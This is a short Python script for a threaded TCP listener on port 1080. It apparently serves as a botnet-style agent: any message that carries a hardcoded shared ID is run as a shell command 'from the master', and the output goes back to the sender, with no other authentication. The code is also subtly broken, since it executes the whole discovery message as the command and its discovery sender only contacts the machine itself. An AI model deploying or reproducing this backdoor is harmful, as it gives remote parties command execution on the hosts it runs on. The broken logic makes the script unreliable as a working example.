import socket
import subprocess
import threading
import uuid

shared_id = "6fa3436f296f18dc8c39e575a18e3874"

def get_own_ip():
    try:
        own_ip = socket.gethostbyname(socket.gethostname())
        return own_ip
    except Exception as e:
        print(f"Error obtaining own IP address: {e}")
        return None

def send_discovery_message(shared_id, own_ip, port):
    try:
        # Create a TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set timeout for connection attempt

        # Connect to the recipient
        sock.connect((own_ip, port))

        # Send discovery message with shared ID
        message = f'DISCOVERY:{shared_id}'.encode()
        sock.sendall(message)
    except Exception as e:
        print(f"Error sending discovery message: {e}")
    finally:
        sock.close()

def handle_connection(client_socket, client_address):
    try:
        # Receive data from client
        data = client_socket.recv(1024)
        received_message = data.decode()

        if received_message.startswith('DISCOVERY:') and received_message.split(':')[1] == shared_id:
            sender_id = received_message.split(':')[1]
            print(f"Received echo from Computer {sender_id} at {client_address[0]}")

            # Execute command from the master
            command = data.decode()
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client_socket.sendall(output)
    except Exception as e:
        print(f"Error handling connection with {client_address}: {e}")
    finally:
        client_socket.close()

def start_server(port):
    own_ip = get_own_ip()
    if own_ip:
        print(f"Local IP address: {own_ip}")

        # Create a TCP socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Bind the socket to the localhost address and port
            server_socket.bind((own_ip, port))

            # Listen for incoming connections
            server_socket.listen(5)

            print(f"Server is listening on port {port}")

            # Accept connections and handle them in separate threads
            while True:
                client_socket, client_address = server_socket.accept()
                client_handler = threading.Thread(target=handle_connection, args=(client_socket, client_address))
                client_handler.start()
        except Exception as e:
            print(f"Error starting server: {e}")
        finally:
            server_socket.close()
    else:
        print(f"Failed to obtain own IP address.")

if __name__ == "__main__":
    # Specify the port number to listen on
    port = 1080  # You can choose any available port number

    # Start the server
    start_server(port)
